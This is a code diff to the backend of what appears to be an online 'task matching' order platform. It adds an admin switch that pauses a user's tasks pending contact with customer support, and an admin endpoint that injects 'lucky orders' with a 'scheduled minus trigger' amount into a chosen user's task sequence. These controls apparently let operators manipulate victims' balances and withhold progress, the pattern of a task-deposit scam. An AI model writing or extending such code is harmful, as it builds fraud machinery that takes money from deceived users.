@@ -277,6 +277,15 @@ app.post('/api/trade/start-matching', authMiddleware, (req, res) => {
   try {
     const user = db.prepare('SELECT * FROM users WHERE id = ?').get(req.user.id);
 
+    // 0. Check if tasks are allowed by administrator
+    if (user.tasks_allowed === 0) {
+      return res.json({
+        success: false,
+        code: 'TASKS_NOT_ALLOWED',
+        message: 'Task matching is currently paused for your account. Please contact customer support or await administrator approval to start tasks.'
+      });
+    }
+
     // 1. Check for unfinished unprepared order
     const pendingOrder = db.prepare('SELECT * FROM orders WHERE user_id = ? AND status = ? ORDER BY id DESC LIMIT 1').get(user.id, 'unprepared');
     if (pendingOrder) {
@@ -961,27 +970,44 @@ app.post('/api/admin/users/:id/toggle-status', adminAuthMiddleware, (req, res) =
   res.json({ success: true, message: `User ${user.username} is now ${newStatus}.` });
 });
 
-// INJECT LUCKY ORDER TO SPECIFIC USER (Full control over trigger, price, commission, product)
+// Toggle user tasks permission (Start / Stop Tasks)
+app.post('/api/admin/users/:id/toggle-tasks', adminAuthMiddleware, (req, res) => {
+  const user = db.prepare('SELECT * FROM users WHERE id = ?').get(req.params.id);
+  if (!user) return res.status(404).json({ success: false, message: 'User not found.' });
+
+  const newTasksAllowed = (user.tasks_allowed === 1 || user.tasks_allowed === null) ? 0 : 1;
+  db.prepare('UPDATE users SET tasks_allowed = ? WHERE id = ?').run(newTasksAllowed, user.id);
+
+  res.json({
+    success: true,
+    tasks_allowed: newTasksAllowed,
+    message: newTasksAllowed ? `Task matching enabled for ${user.username}.` : `Task matching paused for ${user.username}.`
+  });
+});
+
+// INJECT LUCKY ORDER / SCHEDULED MINUS TRIGGER TO SPECIFIC USER
 app.post('/api/admin/users/:id/inject-lucky-order', adminAuthMiddleware, (req, res) => {
-  const { trigger_type, target_task_number, amount, expected_return, product_name, product_image } = req.body;
+  const { trigger_type, target_task_number, amount, expected_return, minus_amount, product_name, product_image } = req.body;
   const user = db.prepare('SELECT * FROM users WHERE id = ?').get(req.params.id);
   if (!user) return res.status(404).json({ success: false, message: 'User not found.' });
 
   const orderAmt = parseFloat(amount) || 315.72;
   const returnAmt = parseFloat(expected_return) || 18.94;
+  const minusAmt = parseFloat(minus_amount) || 0;
   const title = product_name || 'VIP Combination Smart Order Bundle';
   const img = product_image || 'https://images.unsplash.com/photo-1558002038-1055907df827?w=300&auto=format&fit=crop&q=80';
   const now = new Date().toISOString();
 
   db.prepare(`
-    INSERT INTO lucky_order_triggers (user_id, trigger_type, target_task_number, amount, expected_return, product_name, product_image, is_active, created_at)
-    VALUES (?, ?, ?, ?, ?, ?, ?, 1, ?)
+    INSERT INTO lucky_order_triggers (user_id, trigger_type, target_task_number, amount, expected_return, minus_amount, product_name, product_image, is_active, created_at)
+    VALUES (?, ?, ?, ?, ?, ?, ?, ?, 1, ?)
   `).run(
     user.id,
     trigger_type || 'next',
     parseInt(target_task_number || 0, 10),
     orderAmt,
     returnAmt,
+    minusAmt,
     title,
     img,
     now
